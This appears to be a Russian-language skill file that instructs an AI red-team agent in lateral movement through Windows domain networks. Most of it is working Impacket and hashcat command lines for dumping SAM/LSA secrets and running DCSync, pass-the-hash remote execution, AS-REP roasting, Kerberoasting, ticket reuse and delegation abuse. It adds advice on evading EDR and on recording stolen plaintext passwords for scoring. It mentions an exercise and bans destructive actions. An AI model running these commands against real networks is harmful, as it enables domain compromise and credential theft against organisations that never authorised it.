---
name: lateral-movement
description: Латеральное перемещение и повышение привилегий во внутренней сети: набор Impacket (PtH/PsExec/WMI/DCOM/Kerberos/дамп учётных данных) + перечисление через enum4linux/smbclient
whenToUse: Уже есть доступ во внутреннюю сеть: нужно переместиться на другие хосты с имеющимися учётными данными или хешами, перечислить доменную среду, сдампить учётные данные, найти путь к контроллеру домена
role: internal
enabled: true
---

# Латеральное перемещение и повышение привилегий (набор Impacket)

После получения машины и достижимости внутренней сети **перемещение на большее число хостов** (`server-host`) и **поиск контроллера домена/ключевых систем** (`central-system`)
— основная линия этапа внутренней сети. На машине уже установлен **61 команда `impacket-*`** (входит в Kali) — основной набор инструментов этого этапа.

## Инструменты на этой машине

| Инструмент | Путь | Назначение |
| --- | --- | --- |
| Набор Impacket | `/usr/bin/impacket-*` (61 команда) | Перемещение на уровне протоколов, дамп учётных данных, атаки Kerberos |
| enum4linux | `/usr/bin/enum4linux` | Перечисление SMB/домена (пользователи, ресурсы, политики) |
| smbclient | `/usr/bin/smbclient` | Просмотр и чтение/запись общих ресурсов |
| nbtscan | `/usr/bin/nbtscan` | Сканирование имён NetBIOS |
| proxychains4 | `/usr/bin/proxychains4` | Доступ во внутреннюю сеть через туннель (**только с временным конфигом через `-f`**) |

## 0. Что сделать сначала (информация определяет тактику)

```bash
# 1) посмотреть, что уже есть (учётные данные/хеши/данные домена)
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) перечислить доменную среду (когда есть доменная учётная запись)
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # без учётных данных тоже вытаскивает пользователей/ресурсы/политики

# 3) общие ресурсы и файлы
smbclient -L //<target> -N                                  # список ресурсов через null-сессию
smbclient //<target>/<share> -U <user>%<pass>                # чтение общего ресурса
impacket-smbclient <domain>/<user>:<pass>@<target>           # интерактивно: cd/ls/get/put
```

**Сканирование внутренней сети по-прежнему через gogo/fscan** (навыки `gogo-intranet` / `fscan-intranet`) — этот навык отвечает за «как двигаться, когда уже внутри».

## 1. Дамп учётных данных (первый приоритет после получения машины)

```bash
# 1) удалённый дамп SAM/LSA/SECRETS (нужны права администратора)
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # дамп напрямую по хешу

# 2) дамп только локального SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync (при правах доменного администратора или репликации — сразу все хеши домена) — ключевой шаг к контроллеру домена
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) добыть открытые пароли/тикеты: вместе с инструментом на стороне цели (например mimikatz) или lsassy
#    полученные хеши либо вскрывать офлайн через credential-attack, либо сразу PtH (см. ниже)
```

**Обработка результата**: каждый вытащенный хеш `NTLM` вносите через `redteam_credential_add` (`source=дамп учётных данных`,
открытый пароль — в `secret_value`, хеш — в `note` или `secret_value` с указанием типа), файлы — в `runs/`.

## 2. Pass-the-Hash (PtH: перемещение без взлома пароля)

```bash
# выполнение команд
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # интерактивный SYSTEM shell (много шума)
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # полуинтерактивный, меньше шума (рекомендуется)
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # одна команда, самый тихий
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # выполнение через службу

# забрать файлы
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# базы данных
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec создаёт службу, сильно шумит и может быть заблокирован антивирусом**; в приоритете `wmiexec`/`atexec`.

## 3. Атаки Kerberos (при наличии домена)

```bash
# 1) перечисление пользователей + сбор AS-REP (без пароля; ищем аккаунты без предварительной аутентификации)
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # офлайн-взлом

# 2) Kerberoasting (ищем сервисные аккаунты с SPN, собираем TGS и вскрываем офлайн)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) получение и использование тикетов
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # получить TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # перемещение по тикету

# 4) атаки делегирования (путь повышения привилегий в домене)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 4. Переиспользование учётных данных (намного быстрее атаки, пробовать всегда первым)

Получив любой аккаунт или хеш, **сначала пробуйте перемещение**, а не спешите искать новые уязвимости:
1. тот же пароль по другим хостам (`wmiexec` в цикле) + другие протоколы (SMB/WinRM/RDP/SSH/MSSQL/MySQL);
2. переиспользование пароля локального администратора (машины, развёрнутые одним образом, часто с одним паролем) — **самый результативный приём при перемещении по внутренней сети**;
3. доменная учётная запись → пробовать все машины домена, общие ресурсы, админки OA/почты/бастиона/платформы эксплуатации;
4. хеш → PtH на все достижимые хосты (цикл по `runs/hosts.txt`).

## 5. Совместная работа с туннелем (когда цель во внутренней сети недостижима напрямую)

```bash
# все команды через proxychains4 с временным конфигом (системный конфиг не менять)
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ внимание: proxychains проксирует только TCP; UDP-часть Kerberos и часть сценариев обратного подключения требуют проброса портов через chisel/frp
```

## 6. Дисциплина и границы

1. **Сначала сходимость**: цель этапа внутренней сети — **ключевые системы** (контроллер домена / бастион / платформа эксплуатации / кластер БД / репозиторий кода / система резервного копирования),
   а не пройти по каждой машине. Перемещение — лишь средство, зачётные пункты — `server-host` и `central-system`.
2. **Контроль шума**: `psexec` создаёт службу, `secretsdump` обращается к LSASS — EDR это замечает;
   в приоритете `wmiexec`/`atexec`, контролируйте частоту, не проходите весь сегмент грубым перебором.
3. **Не заблокируйте сами себя**: у доменных аккаунтов срабатывает политика блокировки; сначала переиспользуйте готовые учётные данные, брутфорс слабых паролей — по дисциплине ограничения скорости из навыка `credential-attack`.
4. **Деструктивные действия запрещены**: не останавливайте службы, не меняйте конфигурацию системы, не удаляйте логи (если это не требует явно учение и не согласовал пользователь).
5. **Каждый новый хост нужно зарегистрировать**: `redteam_asset_add` (актив внутренней сети, `scope` автоматически internal),
   успешный доступ — `redteam_access_add`, учётные данные — `redteam_credential_add`.

## 7. Вывод и запись в базу (обязательно)

1. **Очки за каждый хост, куда успешно переместились**: `redteam_score_hit` (`server-host`), в `evidence` писать
   «исходный хост → целевой хост:порт｜какие учётные данные/хеш｜результат выполнения» (например `10.0.0.5 → 10.0.0.9:445｜PtH хеш локального администратора｜whoami=nt authority\system`).
2. **Очки за ключевые системы**: дошли до контроллера домена/бастиона/платформы эксплуатации/кластера БД → `central-system`;
   получили большой объём данных → `bigdata-system` (**обязательно указывать фактическое число записей, засчитывается от 1 млн**).
3. **Запись учётных данных**: `redteam_credential_add`, в `source` указать (`дамп учётных данных`/`Kerberoasting`/`AS-REP`/`переиспользование`/`офлайн-взлом`),
   в `tool` — фактический текст команды, открытый пароль — в `secret_value`, путь к файлу — в `secret_ref`.
4. **Запись сессий доступа**: `redteam_access_add` (`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`).
5. Каждое ключевое действие — `redteam_chain_add`: `stage_code=internal` (получение прав во внутренней сети) или `target` (взятие цели),
   **в `tool` — фактический текст команды** (с ключевыми параметрами `-hashes`, `-k -no-pass` и префиксом `proxychains4 -f ...`),
   в `result` — выдержку вывода: отчёт должен воспроизводиться по нему.
6. **Обратная запись в базу знаний**: проверенные рабочие скрипты эксплуатации — `redteam_poc_add` (с `category` + `engagement` + `asset_target` + `verified_note`, с замаскированными чувствительными данными).
